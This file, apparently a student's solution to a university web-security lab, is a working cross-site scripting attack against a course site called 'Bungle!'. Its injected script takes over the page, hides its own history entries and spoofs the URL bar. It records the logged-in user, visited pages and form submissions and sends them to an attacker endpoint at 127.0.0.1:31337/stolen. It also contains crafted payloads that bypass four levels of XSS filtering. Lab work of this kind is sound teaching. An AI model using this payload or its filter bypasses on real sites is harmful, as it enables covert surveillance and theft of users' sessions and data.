@@ -1,0 +1,135 @@
+<meta charset="utf-8">
+<script src="http://ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+<script>
+// Extend this function:
+function payload(attacker) {
+	window.onpopstate = function(event) {
+		//proxy(document.location, "", "", "");
+	};
+	function log(data) {
+		console.log($.param(data))
+		$.get(attacker, data);
+	}
+	function proxy(href, method, event_tag, historyOld) {
+		if($("#logged-in-user").length > 0)
+		{
+			var user = $("#logged-in-user").html();
+		}
+		$("html").load(href, method, function(){
+			if($("#history-list").length > 0)
+			{
+				$("a").each(function() {
+					if($(this).attr("class") == "history-item list-group-item")
+					{
+						if($(this).attr("href").includes("payload"))
+						{
+							$(this).remove();
+						}
+					}
+				});
+			}
+			$("html").show();
+			if(event_tag == "./logout")
+			{
+				log({event: event_tag, user: user, uri: href});
+			}
+			else if(user != null)
+			{
+				log({event: event_tag, user: user, uri: href});
+			}
+			else
+			{
+				log({event: event_tag, uri: href});
+			}
+			$(document).ready(function() {
+				var historyObj;
+				if(event_tag == "nav")
+				{
+					var searchObj = { search: "search" };
+					history.replaceState(searchObj, "", href);
+					historyObj = { foo: href };
+					history.pushState(historyOld, "", href);
+				}
+				else
+				{
+					var searchObj = { search: "search" };
+					history.replaceState(searchObj, "", "http://trurl.cs.illinois.edu");
+					historyObj = { foo: "http://trurl.cs.illinois.edu" };
+					history.pushState(historyOld, "", "http://trurl.cs.illinois.edu");
+				}
+				$("a").each(function() {
+					var href = $(this).attr("href");
+					$(this).bind("click", function () {proxy(href, "", "nav"); return false;});
+				});
+				$("form").each(function() {
+					$(this).on("submit", function(e) {
+						e.preventDefault();
+						var data = $(this).serializeArray().reduce(function(key, value) { 
+							key[value.name] = value.value;
+							return key;
+					}, {});
+						var action = $(this).attr("action");
+						var request_params = $(this).serialize();
+						if($(this).attr("method") == "post")
+						{
+							proxy(""+action+"?"+request_params, data, action, historyObj);
+						}
+						else if($(this).attr("method") == "get")
+						{
+							proxy("" + action +"?"+ request_params, "", "nav", historyObj);
+						}
+					});
+				});
+			});
+		});
+	}
+	$("html").hide();
+	proxy("./", "");
+	var searchObj = { search: "search" };
+	history.replaceState(searchObj, "", "http://trurl.cs.illinois.edu");
+}
+
+function makeLink(xssdefense, target, attacker) {
+	if (xssdefense == 0) {
+		return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" 		+
+		encodeURIComponent("<script" + ">" + payload.toString() +
+		";payload(\"" + attacker + "\");</script" + ">");
+	} else {
+		// Implement code to defeat XSS defenses here.
+		if (xssdefense == 1)
+		{
+			return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" 		+
+			encodeURIComponent("<scrscriptipt" + ">" + payload.toString() +
+			";payload(\"" + attacker + "\");</scrscriptipt" + ">");
+		}
+		else if (xssdefense == 2)
+		{
+			return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" 		+
+			encodeURIComponent("<img src=exploit? onerror='" + payload.toString() +
+			";payload(\"" + attacker + "\");'></img" + ">");
+		}
+		else if (xssdefense == 3)
+		{
+			return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" 		+
+			encodeURIComponent("<audio src=exploit? onerror='" + payload.toString() +
+			";payload(\"" + attacker + "\");'></audio" + ">");
+		}
+		else if (xssdefense == 4)
+		{
+			return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" 		+
+			encodeURIComponent("<audio src=exploit? onerror='" + payload.toString() +
+			";payload(\"" + attacker + "\");'></audio" + ">");
+		}
+	}
+}
+
+var xssdefense = 3;
+var target = "http://trurl.cs.illinois.edu/";
+var attacker = "http://127.0.0.1:31337/stolen";
+
+$(function() {
+	var url = makeLink(xssdefense, target, attacker);
+	$("h3").html("<a target=\"run\" href=\"" + url + "\">Try Bungle!</a>");
+});
+</script>
+<h3></h3>
